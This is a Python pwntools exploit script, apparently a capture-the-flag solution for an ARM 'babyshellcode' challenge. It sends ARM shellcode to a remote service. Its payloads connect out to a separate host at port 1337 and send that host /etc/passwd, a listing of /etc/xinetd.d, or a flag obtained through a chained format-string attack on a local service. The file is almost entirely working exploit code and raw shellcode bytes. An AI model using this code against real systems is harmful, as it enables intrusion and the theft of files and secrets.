from pwn import *
import time
import sys

context.arch = "thumb"

def babyshellcode(DEBUG):
	if DEBUG=="1":
		r = process("./babyshellcode")
		# raw_input("debug?")
	elif DEBUG=="2":
		HOST = '212.47.229.147'
		PORT = 9999
		r = remote(HOST,PORT)
	
	def calc(addr):
		addr_h = hex(addr)[2:]
		res = "c"+addr_h[0]+"f2"+addr_h[2:]+addr_h[1]+"2"
		return res.decode("hex")
	
	def sock_send(size):
		payload = asm(shellcraft.read("r10", 'sp', size))
		payload += asm(shellcraft.write("r6", 'sp', size))
		return payload
	
	def sock_recv(size):
		payload = asm(shellcraft.read("r6", 'sp', size))
		payload += asm(shellcraft.write("r10", 'sp', size))
		return payload
	
	def fmt_read():
		return asm(shellcraft.read("r6", 'sp', 0x100))
	
	
	def shellcode_getFlag():
		payload = "\x00\x00\x00\x00\x50\x90\x50\x90\x50\x90\x50\x90"
		payload += asm(pwnlib.shellcraft.arm.linux.connect("157.230.46.201", 1337)) # r10
		payload += asm("mov r10, r6")
		payload += asm(pwnlib.shellcraft.arm.linux.connect("127.0.0.1", 8888)) # r6
		payload += fmt_read()
		payload += sock_send(9) # "%52$p---"
		payload += sock_recv(11) # 0x48e010
		payload += fmt_read()
		payload += sock_send(0xc) # get flag
		payload += sock_recv(0x100)
		return payload
	
	def shellcode_readFile():
		filename = "/etc/passwd"
		# filename = "/home/babyfmt/babyfmt"
		payload = "\x00\x00\x00\x00\x50\x90\x50\x90\x50\x90\x50\x90"
		payload += asm(pwnlib.shellcraft.arm.linux.connect("157.230.46.201", 1337))
		payload += asm(pwnlib.shellcraft.arm.linux.cat(filename,"r6"))
		return payload
	
	def shellcode_readdir():
		dirname = "/etc/xinetd.d"
		payload = "\x00\x00\x00\x00\x50\x90\x50\x90\x50\x90\x50\x90"
		payload += "\x00"*0x20
		payload += asm(pwnlib.shellcraft.arm.linux.connect("157.230.46.201", 1337))
		payload += asm("mov r10, r6")
		# O_RDONLY|O_NONBLOCK|O_DIRECTORY|O_CLOEXEC = 0x84800
		payload += asm(pwnlib.shellcraft.open(dirname,0x84800,0x11f3bf00))
		payload += asm("sub r9, sp, #12288")
		payload += asm(shellcraft.arm.linux.syscall('SYS_getdents', "r0", "r9", 0x2000, 0))
		payload += asm(shellcraft.write("r10", 'r9', 0x2000))
		payload += asm(pwnlib.shellcraft.arm.linux.echo("---","r10"))
		return payload
	
	r.recvuntil("Your secret: ")
	
	# payload = shellcode_readFile()
	# payload = shellcode_getFlag() # fmt
	payload = shellcode_readdir() # readdir
	r.sendline(payload)
	r.recvuntil("Small leak: ")
	leak = int(r.recvuntil("\n").strip(),16) >> 16
	payload = calc(leak) + "\x7d\x46\x28\x47\x22\x26\xe0\xe1\x02\x26\xe0\xe1\x01\x20\x82\xe2\x01\x50\x8f\xe2\x15\xff\x2f\xe1\x04\x32\x10\x1c\x08\x4b\x00\x21\x21\x27\x01\xdf\x76\x40\x0e\x3e\xb0\x42\xe9\xd0\x14\x68\x9c\x42\xf2\xd1\x15\x1d\x2c\x68\x9c\x42\xee\xd1\x05\x35\x28\x47\x00\x00\x50\x90\x50\x90"
	r.sendline(payload)
	r.interactive()

babyshellcode(sys.argv[1])